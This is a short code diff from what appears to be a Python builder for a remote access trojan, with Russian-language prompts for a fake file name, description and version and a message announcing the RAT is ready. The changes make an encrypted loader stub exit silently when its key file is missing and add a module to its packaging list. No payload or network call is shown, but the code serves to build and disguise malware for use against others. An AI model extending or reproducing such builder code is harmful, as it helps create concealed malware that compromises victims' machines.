@@ -48,8 +48,12 @@ def encrypt(filename, key, keyname):
 from cryptography.fernet import Fernet
 import os
 from base64 import b64encode, b64decode
+import sys
 
-key = open("{keyname}.key", "rb").read()
+try:
+    key = open("{keyname}.key", "rb").read()
+except:
+    sys.exit("")
 
 
 def decrypt(key):
@@ -97,7 +101,7 @@ name = input('\n* Введите название файла:\n* > ')
 description = input('\n* Введите описание файла:\n* > ')
 version = input('\n* Введите версию файла:\n* > ')
 
-included_modules = ['asyncio', 'subprocess', 'tkinter', 'messagebox', 'ctypes']
+included_modules = ['asyncio', 'subprocess', 'tkinter', 'messagebox', 'ctypes', 'sys']
 
 print('\n* RAT готов, подготавливаю watchdog...')
 
